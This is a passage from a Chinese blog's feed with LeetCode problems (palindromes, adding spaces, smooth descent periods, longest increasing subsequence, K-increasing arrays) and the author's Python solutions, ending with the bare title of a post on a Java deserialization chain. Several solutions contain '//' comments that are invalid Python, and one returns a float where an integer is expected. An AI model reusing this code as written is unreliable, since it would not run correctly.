class="code"><pre><span class="line">输入：words = [&quot;def&quot;,&quot;ghi&quot;]</span><br><span class="line">输出：&quot;&quot;</span><br><span class="line">解释：不存在回文字符串，所以返回一个空字符串。</span><br></pre></td></tr></table></figure><p>这道没什么说的，依次遍历每一个字符串取反后进行比较，如果相等直接返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">firstPalindrome</span><span class="params">(self, words)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type words: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            r_word = word[::<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> r_word == word:</span><br><span class="line">                <span class="keyword">return</span> word</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure><h4 id="向字符串添加空格"><a href="#向字符串添加空格" class="headerlink" title="向字符串添加空格"></a>向字符串添加空格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给你一个下标从 0 开始的字符串 s ，以及一个下标从 0 开始的整数数组 spaces。</span><br><span class="line">数组 spaces 描述原字符串中需要添加空格的下标。每个空格都应该插入到给定索引处的字符值之前。</span><br><span class="line">例如，s = &quot;EnjoyYourCoffee&quot; 且 spaces = [5, 9] ，那么我们需要在 &apos;Y&apos; 和 &apos;C&apos; 之前添加空格，这两个字符分别位于下标 5 和下标 9 。因此，最终得到 &quot;Enjoy Your Coffee&quot; 。</span><br><span class="line">请你添加空格，并返回修改后的字符串。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;LeetcodeHelpsMeLearn&quot;, spaces = [8,13,15]</span><br><span class="line">输出：&quot;Leetcode Helps Me Learn&quot;</span><br><span class="line">解释：</span><br><span class="line">下标 8、13 和 15 对应 &quot;LeetcodeHelpsMeLearn&quot; 中加粗斜体字符。</span><br><span class="line">接着在这些字符前添加空格。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;icodeinpython&quot;, spaces = [1,5,7,9]</span><br><span class="line">输出：&quot;i code in py thon&quot;</span><br><span class="line">解释：</span><br><span class="line">下标 1、5、7 和 9 对应 &quot;icodeinpython&quot; 中加粗斜体字符。</span><br><span class="line">接着在这些字符前添加空格。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;spacing&quot;, spaces = [0,1,2,3,4,5,6]</span><br><span class="line">输出：&quot; s p a c i n g&quot;</span><br><span class="line">解释：</span><br><span class="line">字符串的第一个字符前可以添加空格。</span><br></pre></td></tr></table></figure><p>这道题的思路是：根据要插入空格的地方将字符串进行拆分，将拆分后的字符串通过空格连接即可。这里要注意<code>spaces</code>第一个位置和最后一个位置的处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addSpaces</span><span class="params">(self, s, spaces)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :type spaces: List[int]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(spaces)):</span><br><span class="line">          //处理spaces第一个位置</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                res.append(s[<span class="number">0</span>:spaces[<span class="number">0</span>]])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(s[spaces[i<span class="number">-1</span>]:spaces[i]])</span><br><span class="line">        //处理spaces最后一个位置</span><br><span class="line">        <span class="keyword">if</span> spaces[<span class="number">-1</span>]&lt;len(s):</span><br><span class="line">            res.append(s[spaces[<span class="number">-1</span>]:])</span><br><span class="line">        <span class="keyword">return</span> <span class="string">" "</span>.join(res)</span><br></pre></td></tr></table></figure><h4 id="股票平滑下跌阶段的数目"><a href="#股票平滑下跌阶段的数目" class="headerlink" title="股票平滑下跌阶段的数目"></a>股票平滑下跌阶段的数目</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给你一个整数数组 prices ，表示一支股票的历史每日股价，其中 prices[i] 是这支股票第 i 天的价格。</span><br><span class="line">一个 平滑下降的阶段 定义为：对于 连续一天或者多天 ，每日股价都比 前一日股价恰好少 1 ，这个阶段第一天的股价没有限制。</span><br><span class="line">请你返回 平滑下降阶段 的数目。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：prices = [3,2,1,4]</span><br><span class="line">输出：7</span><br><span class="line">解释：总共有 7 个平滑下降阶段：</span><br><span class="line">[3], [2], [1], [4], [3,2], [2,1] 和 [3,2,1]</span><br><span class="line">注意，仅一天按照定义也是平滑下降阶段。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：prices = [8,6,7,7]</span><br><span class="line">输出：4</span><br><span class="line">解释：总共有 4 个连续平滑下降阶段：[8], [6], [7] 和 [7]</span><br><span class="line">由于 8 - 6 ≠ 1 ，所以 [8,6] 不是平滑下降阶段。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：prices = [1]</span><br><span class="line">输出：1</span><br><span class="line">解释：总共有 1 个平滑下降阶段：[1]</span><br></pre></td></tr></table></figure><p>这道题思路也比较简单，首先我们考虑一下，对于连续1天，则可以得到平滑下降的阶段是1个，对于连续2天，则可以得到平滑下降的阶段是3个，假如<code>prices=[2,1]</code>，则阶段值为<code>[2],[1],[2,1]</code>，对于连续3天，则可以得到平滑下降的阶段是6个，假如<code>prices=[3,2,1]</code>，则阶段值为<code>[3],[2],[1],[3,2],[2,1],[3,2,1]</code>，这样我们就可以找到规律，对于连续n天，平滑下降的阶段是<code>1+2+...+n</code>的值。</p><p>所以我们可以依次遍历<code>prices</code>中的值，找到每一个连续平滑阶段，并根据每一个阶段中的值计算数目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDescentPeriods</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(prices) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        res = []</span><br><span class="line">        tmp=[]</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        i=<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(prices):</span><br><span class="line">          //如果前一个比后一个多<span class="number">1</span>，则他们属于一个平滑阶段</span><br><span class="line">            <span class="keyword">if</span> prices[i<span class="number">-1</span>]-prices[i] == <span class="number">1</span>:</span><br><span class="line">                tmp.append(prices[i<span class="number">-1</span>])</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">              //这里因为前一个值还没有加入到tmp中，因此先添加前一个值</span><br><span class="line">                tmp.append(prices[i<span class="number">-1</span>])</span><br><span class="line">                ////先把之前的平滑阶段保存起来</span><br><span class="line">                res.append(tmp)</span><br><span class="line">                //判断后续的平滑阶段，因此tmp置为空</span><br><span class="line">                tmp=[]</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> tmp:</span><br><span class="line">          //如果tmp中有值，那说明最后一段没有加入到res中</span><br><span class="line">            res.append(tmp)</span><br><span class="line">        //如果prices中最后一个值比倒数第二个值小<span class="number">1</span>，则最后一个值属于倒数第二个tmp平滑阶段</span><br><span class="line">        <span class="keyword">if</span> prices[<span class="number">-2</span>] - prices[<span class="number">-1</span>] == <span class="number">1</span>:</span><br><span class="line">            res[<span class="number">-1</span>].append(prices[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          //否则的话最后一个值单独组成一个平滑阶段</span><br><span class="line">            res.append([prices[<span class="number">-1</span>]])</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">          //计算累加和</span><br><span class="line">          result += (<span class="number">1</span>+len(r))*len(r)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>做最后这道题之前，我们先做一下<code>Leetcode</code>第300题，最长递增子序列。</p><h4 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给你一个整数数组 nums ，找到其中最长严格递增子序列的长度。</span><br><span class="line">子序列是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。例如，[3,6,2,7] 是数组 [0,3,1,6,2,2,7] 的子序列。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [10,9,2,5,3,7,101,18]</span><br><span class="line">输出：4</span><br><span class="line">解释：最长递增子序列是 [2,3,7,101]，因此长度为 4 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [0,1,0,3,2,3]</span><br><span class="line">输出：4</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [7,7,7,7,7,7,7]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure><p>这道题要找的是严格递增的子序列，我们首先来根据动态规划的思路走一遍。</p><p>如果<code>nums</code>的长度是1，那么不用考虑，直接返回1即可。</p><ul><li>从<code>nums</code>的长度大于等于2开始，首先我们要初始化一个<code>dp数组</code>。这个数组的初值可以全部设置为1，因为最短的子序列长度也是1。</li><li>从第2个值开始遍历，依次比较当前值之前的所有值，从而更新当前值之前的最长子序列长度，更新到<code>dp[i]</code>中</li><li>设置一个全局的值，用来保存最长子序列的长度</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        <span class="keyword">if</span> len(nums) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> len(nums)</span><br><span class="line">        <span class="comment">#初始化dp数组，其中dp[i]表示i之前包含i的最长上升子序列的长度</span></span><br><span class="line">        dp = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums))]</span><br><span class="line">        <span class="comment">#用来保存最大值</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="comment">#如果当前i的值大于i之前的值</span></span><br><span class="line">                <span class="keyword">if</span> nums[i] &gt; nums[j]:</span><br><span class="line">                    <span class="comment">#则对当前dp[i]中的值进行更新</span></span><br><span class="line">                    dp[i] = max(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#如果当前dp[i]的值大于res的值，则更新res</span></span><br><span class="line">            <span class="keyword">if</span> dp[i] &gt; res:</span><br><span class="line">                res = dp[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>另一种做法，通过<code>bisect</code>模块实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        dp = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> nums:</span><br><span class="line">          <span class="comment">#因为要求得是严格递增的，因此这里遇到重复的值直接跳过</span></span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">in</span> dp:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#找到当前值在dp中应该插入的位置</span></span><br><span class="line">            pos = bisect.bisect(dp, x)</span><br><span class="line">            <span class="comment">#这里会有两种情况，一种是dp为空，一种是pos应该插入到dp中最后一个位置</span></span><br><span class="line">            <span class="keyword">if</span> pos == len(dp):</span><br><span class="line">                dp.append(x)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">              <span class="comment">#这种情况说明pos应该插入到dp中间位置。</span></span><br><span class="line">                dp[pos] = x</span><br><span class="line">        <span class="keyword">return</span> len(dp)</span><br></pre></td></tr></table></figure><h4 id="使数组-K-递增的最少操作次数"><a href="#使数组-K-递增的最少操作次数" class="headerlink" title="使数组 K 递增的最少操作次数"></a>使数组 K 递增的最少操作次数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">给你一个下标从 0 开始包含 n 个正整数的数组 arr ，和一个正整数 k 。</span><br><span class="line">如果对于每个满足 k &lt;= i &lt;= n-1 的下标 i ，都有 arr[i-k] &lt;= arr[i] ，那么我们称 arr 是 K 递增 的。</span><br><span class="line">比方说，arr = [4, 1, 5, 2, 6, 2] 对于 k = 2 是 K 递增的，因为：</span><br><span class="line">arr[0] &lt;= arr[2] (4 &lt;= 5)</span><br><span class="line">arr[1] &lt;= arr[3] (1 &lt;= 2)</span><br><span class="line">arr[2] &lt;= arr[4] (5 &lt;= 6)</span><br><span class="line">arr[3] &lt;= arr[5] (2 &lt;= 2)</span><br><span class="line">但是，相同的数组 arr 对于 k = 1 不是 K 递增的（因为 arr[0] &gt; arr[1]），对于 k = 3 也不是 K 递增的（因为 arr[0] &gt; arr[3] ）。</span><br><span class="line">每一次 操作 中，你可以选择一个下标 i 并将 arr[i] 改成任意 正整数。</span><br><span class="line">请你返回对于给定的 k ，使数组变成 K 递增的 最少操作次数 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [5,4,3,2,1], k = 1</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">对于 k = 1 ，数组最终必须变成非递减的。</span><br><span class="line">可行的 K 递增结果数组为 [5,6,7,8,9]，[1,1,1,1,1]，[2,2,3,4,4] 。它们都需要 4 次操作。</span><br><span class="line">次优解是将数组变成比方说 [6,7,8,9,10] ，因为需要 5 次操作。</span><br><span class="line">显然我们无法使用少于 4 次操作将数组变成 K 递增的。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [4,1,5,2,6,2], k = 2</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">这是题目描述中的例子。</span><br><span class="line">对于每个满足 2 &lt;= i &lt;= 5 的下标 i ，有 arr[i-2] &lt;= arr[i] 。</span><br><span class="line">由于给定数组已经是 K 递增的，我们不需要进行任何操作。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [4,1,5,2,6,2], k = 3</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">下标 3 和 5 是仅有的 3 &lt;= i &lt;= 5 且不满足 arr[i-3] &lt;= arr[i] 的下标。</span><br><span class="line">将数组变成 K 递增的方法之一是将 arr[3] 变为 4 ，且将 arr[5] 变成 5 。</span><br><span class="line">数组变为 [4,1,5,4,6,5] 。</span><br><span class="line">可能有其他方法将数组变为 K 递增的，但没有任何一种方法需要的操作次数小于 2 次。</span><br></pre></td></tr></table></figure><p>这道题和<code>Leetcode</code>第300题有些类似，只不过这里面加了一个K递增的概念。而且要注意的是，这里面没有要求严格递增。所以这道题我们可以分三步走</p><ul><li>首先将数组分为k组</li><li>对k组中的每个数组遍历，求解每个数组的最长子序列</li><li>这k组中的每个数组长度减去每个数组的最长子序列就可以得到每个数组需要修改的最少操作数</li></ul><p>最终将k组中每个数组变为非递减需要的最少操作数相加即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kIncreasing</span><span class="params">(self, arr, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(k)]</span><br><span class="line">        <span class="comment">#将数组分成k个字数组</span></span><br><span class="line">        <span class="keyword">for</span> index,v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">            nums[index % k].append(v)</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="comment">#print(nums)</span></span><br><span class="line">        <span class="comment">#分别对每一个子数组求需要修改的最少操作次数</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            res += self.lengthOfLIS(num)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        <span class="keyword">if</span> len(nums) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="comment">#初始化dp数组，其中dp[i]表示i之前包含i的最长上升子序列的长度</span></span><br><span class="line">        dp = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums))]</span><br><span class="line">        <span class="comment">#用来保存最大值</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="comment">#如果当前i的值大于i之前的值</span></span><br><span class="line">                <span class="keyword">if</span> nums[i] &gt;= nums[j]:</span><br><span class="line">                    <span class="comment">#则对当前dp[i]中的值进行更新</span></span><br><span class="line">                    dp[i] = max(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#如果当前dp[i]的值大于res的值，则更新res</span></span><br><span class="line">            <span class="keyword">if</span> dp[i] &gt; res:</span><br><span class="line">                res = dp[i]</span><br><span class="line">        <span class="comment">#res是最长递增子序列，长度减去之后就是需要修改的个数</span></span><br><span class="line">        <span class="keyword">return</span> len(nums) - res</span><br></pre></td></tr></table></figure><p>超时了。。。。😭</p><p>另外一种做法，没超时🐶，基本思路还是一样的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kIncreasing</span><span class="params">(self, arr, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(k)]</span><br><span class="line">        <span class="comment">#将数组分成k个字数组</span></span><br><span class="line">        <span class="keyword">for</span> index,v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">            nums[index % k].append(v)</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="comment">#print(nums)</span></span><br><span class="line">        <span class="comment">#分别对每一个子数组求需要修改的最少操作次数</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            res += self.lengthOfLIS(num)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self,nums)</span>:</span></span><br><span class="line">            dp = []</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> nums:</span><br><span class="line">                pos = bisect_right(dp, x)</span><br><span class="line">                <span class="keyword">if</span> pos == len(dp):</span><br><span class="line">                    dp.append(x)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[pos] = x</span><br><span class="line">            <span class="keyword">return</span> len(nums) - len(dp)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;找出数组中的第一个回文字符串&quot;&gt;&lt;a href=&quot;#找出数组中的第一个回文字符串&quot; class=&quot;headerlink&quot; title=&quot;找出数组中的第一个回文字符串&quot;&gt;&lt;/a&gt;找出数组中的第一个回文字符串&lt;/h4&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Java CC2链复现与分析</title>
    <link href="elssm.github.io/2021/12/15/Java-CC2%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>elssm.github.io/2021/12/15/Java-CC2链复现与分析/</id>
    <published>2021-12-15T01:16:42.000Z</published>
    <updated>2021-12-15T03:59:52.874Z</updated>
    
